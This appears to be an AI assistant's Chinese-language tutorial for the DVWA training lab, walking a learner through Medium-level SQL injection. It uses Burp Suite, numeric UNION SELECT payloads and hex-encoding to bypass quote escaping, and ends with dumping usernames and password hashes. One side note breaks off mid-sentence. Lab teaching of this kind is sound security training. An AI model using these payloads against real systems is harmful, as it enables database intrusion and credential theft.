太棒了！你已经准备好进阶了。

在 DVWA 中，**Medium（中等难度）** 的 SQL 注入与 Low 难度相比，最大的变化是开发者加了“防护”。

### 🔍 Medium 难度的核心变化：

1. **请求方式改变：** 输入框变成了**下拉菜单（Dropdown）**，请求方式从 GET 变成了 **POST**。
2. **过滤了单引号：** 后台代码使用了 `mysql_real_escape_string()` 函数，把你输入的单引号 `'` 转义成了 `\'`，导致我们在 Low 难度下用的单引号闭合失效了。
3. **变成了数字型注入：** 后台的 SQL 语句去掉了包裹变量的单引号（变成了 `user_id = $id`），这意味着我们**根本不需要用单引号去闭合**，直接进行数字型注入即可。

---

### 🛠️ 准备工作：使用 Burp Suite 抓包

因为现在是下拉菜单，我们没法直接在页面上输入代码，必须借助 **Burp Suite** 拦截并修改请求。

1. 将 DVWA 的安全级别设置为 **Medium**。
2. 打开 Burp Suite，配置好浏览器代理，确保能拦截到流量。
3. 在 DVWA 页面随便选择一个 User ID，点击 `View Details`，此时 Burp Suite 会拦截到这个 POST 请求。

---

### 💥 攻击步骤（在 Burp Suite 的 Repeater 中进行）：

拦截到请求后，你会看到类似 `id=1&Submit=Submit` 的数据。我们把 `id=1` 替换为以下 Payload 进行测试：

#### 第一步：判断注入类型（数字型注入）

在 Low 难度我们用的是 `1' and 1=1#`，现在单引号被过滤了，我们直接去掉单引号：

- 输入：`id=1 and 1=1&Submit=Submit` -> 页面正常返回数据。
- 输入：`id=1 and 1=2&Submit=Submit` -> 页面返回为空或报错。
- **结论：** 存在数字型注入，不需要单引号！

#### 第二步：判断字段数

- 输入：`id=1 order by 2&Submit=Submit` -> 正常。
- 输入：`id=1 order by 3&Submit=Submit` -> 报错。
- **结论：** 依然是 2 个字段。

#### 第三步：联合查询（UNION SELECT）

注意：因为是数字型注入，前面必须保留一个数字（比如 `0` 或 `1`），否则 SQL 语法会报错。

- 输入：`id=0 union select 1,2&Submit=Submit`
- **预期结果：** 页面正常显示数字 `1` 和 `2`，说明这两个位置都可以用来回显数据。

#### 第四步：获取数据库信息

- **查库名：** `id=0 union select 1,database()&Submit=Submit`
- **查表名：** `id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit` 
> [!note] 
> 避免dvwa 和sql 字符集排序冲突，在 `group_concat(table_name)`和`COLLATE utf8_general_ci`

---

### ⚠️ Medium 难度最容易踩的坑（高能预警）：

当你试图查询 `users` 表的字段或数据时，你可能会写出这样的代码：  
`id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'&Submit=Submit`

**这时候绝对会报错！** 为什么？  
因为你的 Payload 里面又出现了单引号 `'users'`，它会被后台的 `mysql_real_escape_string()` 转义掉！

**💡 破局绝招：使用 Hex（十六进制）编码绕过**  
既然单引号不能用，我们可以把字符串 `users` 转换成十六进制格式 `0x7573657273`，MySQL 会自动识别它。

- **查 users 表的字段名（完美绕过单引号）：**
    
    ```text
    id=0 union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name=0x7573657273&Submit=Submit
    ```
    
- **直接脱裤（提取账号和密码）：**
    
    ```text
    id=0 union select user,password from users&Submit=Submit
    ```
    
    _(注意：这里不需要写 `from 0x...`，因为 `users` 是默认库里的表，直接写表名即可；如果非要写，也可以写成 `0x7573657273`)_

---

**🚀 你的进阶任务：**  
打开 Burp Suite，把安全级别调到 Medium，按照上面的步骤，**不使用任何一个单引号**，把 `dvwa` 数据库里的账号密码全部“偷”出来！

去实操一下吧！如果遇到 `Illegal mix of collations` 报错，或者单引号绕过失败，随时把报错信息发给我！